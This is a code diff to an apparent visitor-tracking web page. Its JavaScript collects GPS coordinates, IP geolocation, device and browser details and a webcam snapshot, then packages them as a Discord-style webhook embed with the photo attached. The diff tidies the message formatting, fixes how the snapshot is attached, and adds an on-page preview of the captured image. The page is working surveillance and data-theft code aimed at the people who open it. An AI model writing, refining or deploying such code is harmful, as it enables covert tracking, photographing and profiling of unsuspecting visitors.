@@ -55,7 +55,7 @@
     function dataURLtoBlob(dataurl) {
       const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
         bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-      while(n--) u8arr[n] = bstr.charCodeAt(n);
+      while (n--) u8arr[n] = bstr.charCodeAt(n);
       return new Blob([u8arr], { type: mime });
     }
 
@@ -66,36 +66,32 @@
 
       const formData = new FormData();
 
-      if (capturedImageData) {
-        const blob = dataURLtoBlob(capturedImageData);
-        formData.append("file", blob, "snapshot.png"); // ✅ Correct key: "file"
-      }
-
       const payload = {
         embeds: [{
           title: "📍 GPS & Device Info",
-          description: `**Latitude:** ${coords.lat}  
-**Longitude:** ${coords.lon}  
-**Accuracy:** ${coords.acc} meters  
-**Map:** ${mapLink !== "N/A" ? `[View Location](${mapLink})` : "Location not available"}
-
-🌐 **IP Info**  
-**IP:** ${ipData.ipAddress}  
-**City:** ${ipData.city}  
-**Region:** ${ipData.stateProv}  
-**Country:** ${ipData.countryName}
-
-🖥️ **Device Info**  
-**Platform:** ${device.platform}  
-**Browser:** ${device.userAgent}  
-**Language:** ${device.language}  
-**Screen:** ${device.screen}  
-**Touch Support:** ${device.touchSupport}
-
-🕒 ${new Date().toLocaleString()}`,
-          image: capturedImageData ? { url: "attachment://snapshot.png" } : undefined
+          description:
+            `**Latitude:** ${coords.lat}   \n**Longitude:** ${coords.lon}   \n**Accuracy:** ${coords.acc} meters` +
+            `\n**Map:** ${mapLink !== "N/A" ? `[View Location](${mapLink})` : "Location not available"}` +
+            `\n\n🌐 **IP Info**` +
+            `\n**IP:** ${ipData.ipAddress}` +
+            `\n**City:** ${ipData.city}` +
+            `\n**Region:** ${ipData.stateProv}` +
+            `\n**Country:** ${ipData.countryName}` +
+            `\n\n🖥️ **Device Info**` +
+            `\n**Platform:** ${device.platform}` +
+            `\n**Browser:** ${device.userAgent}` +
+            `\n**Language:** ${device.language}` +
+            `\n**Screen:** ${device.screen}` +
+            `\n**Touch Support:** ${device.touchSupport}` +
+            `\n\n🕒 ${new Date().toLocaleString()}`
         }]
       };
+
+      if (capturedImageData) {
+        const blob = dataURLtoBlob(capturedImageData);
+        formData.append("file", blob, "snapshot.png");
+        payload.embeds[0].image = { url: "attachment://snapshot.png" };
+      }
 
       formData.append("payload_json", JSON.stringify(payload));
 
@@ -146,6 +142,10 @@
               const ctx = canvas.getContext("2d");
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
               capturedImageData = canvas.toDataURL("image/png");
+
+              // OPTIONAL: Preview image (you can delete the next line later)
+              document.body.appendChild(canvas);
+
               stream.getTracks().forEach(track => track.stop());
               resolve();
             };
